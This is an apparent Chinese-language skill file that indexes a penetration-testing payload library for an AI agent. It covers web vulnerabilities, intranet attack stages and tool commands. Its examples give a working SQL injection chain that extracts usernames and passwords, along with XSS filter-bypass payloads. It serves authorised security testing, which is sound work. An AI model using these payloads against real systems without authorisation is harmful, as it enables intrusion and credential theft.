---
name: security-testing
description: 渗透测试 Payload 知识库 - 提供 SQL注入、XSS、SSRF、RCE、LFI、XXE、SSTI 等漏洞的 Payload、WAF绕过和攻击链模板。支持 Web渗透、内网渗透、工具命令。
---

# Security Testing - 渗透测试 Payload 知识库

## 概述

本 Skill 提供完整的渗透测试 Payload 知识库、工具命令和攻击链模板，供 AI-Agent 在执行安全测试时参考使用。

## 漏洞类别

### Web 漏洞

| 类别 | 路径 | 说明 |
|------|------|------|
| SQL 注入 | `data/web/sqli/` | MySQL/MSSQL/Oracle/PostgreSQL/MongoDB/Redis |
| XSS | `data/web/xss/` | 反射型、存储型、DOM 型 |
| SSRF | `data/web/ssrf/` | 服务端请求伪造 |
| RCE | `data/web/rce/` | 远程代码执行 |
| LFI | `data/web/lfi/` | 文件包含 |
| XXE | `data/web/xxe/` | XML 实体注入 |
| SSTI | `data/web/ssti/` | 模板注入 |
| CSRF | `data/web/csrf.md` | 跨站请求伪造 |
| JWT | `data/web/jwt.md` | JSON Web Token |
| API | `data/web/api.md` | API 安全 |

### 内网渗透

| 阶段 | 路径 | 说明 |
|------|------|------|
| 信息收集 | `data/intranet/recon/` | 目标探测、端口扫描 |
| 凭证窃取 | `data/intranet/cred theft/` | 密码抓取、Hash 传递 |
| 横向移动 | `data/intranet/lateral/` | 令牌窃取、远程服务 |
| 权限提升 | `data/intranet/privesc/` | 本地提权、Sudo 攻击 |
| 权限维持 | `data/intranet/persistence/` | 后门、计划任务 |
| 隧道代理 | `data/intranet/tunnel/` | 端口转发、SOCKS 代理 |
| 域渗透 | `data/intranet/ad-attack/` | AD 枚举、Kerberos 攻击 |

### 工具命令

| 工具 | 路径 |
|------|------|
| Nmap | `data/tools/nmap.md` |
| SQLMap | `data/tools/sqlmap.md` |
| Metasploit | `data/tools/metasploit.md` |
| Hydra | `data/tools/hydra.md` |
| Hashcat | `data/tools/hashcat.md` |
| CrackMapExec | `data/tools/crackmapexec.md` |
| PowerShell | `data/tools/powershell.md` |

## 使用方式

### 按漏洞类型查询

当需要进行特定漏洞测试时，参考对应 Payload：

```markdown
参考 data/web/sqli/ 获取 SQL 注入 Payload
参考 data/web/xss/ 获取 XSS Payload
```

### 攻击链构造

每个漏洞目录包含：
- **基础 Payload** - 常用测试语句
- **WAF 绕过** - 编码、混淆、拆分
- **攻击链** - 组合利用步骤
- **详细分类** - 技术原理和变种

### 工具使用

```markdown
参考 data/tools/sqlmap.md 使用 SQLMap
参考 data/tools/nmap.md 进行端口扫描
```

## 示例

### SQL 注入攻击链

```markdown
1. 检测点: id=1
2. 基础测试: id=1' OR '1'='1
3. 确认注入: id=1 AND 1=1 (正常) vs id=1 AND 1=2 (错误)
4. 枚举数据库: id=1 UNION SELECT null,table_name FROM information_schema.tables
5. 提取数据: id=1 UNION SELECT null,username,password FROM users
```

### XSS WAF 绕过

```markdown
1. 基础测试: <script>alert(1)</script>
2. 大小写混合: <ScRiPt>alert(1)</ScRiPt>
3. HTML 编码: &lt;script&gt;alert(1)&lt;/script&gt;
4. URL 编码: %3Cscript%3Ealert(1)%3C/script%3E
5. 拆分绕过: <scr'+'ipt>alert(1)</scr'+'ipt>
```

## 重要

- 仅用于授权渗透测试
- 遵循网络安全法律法规
- 遵守授权范围和期限
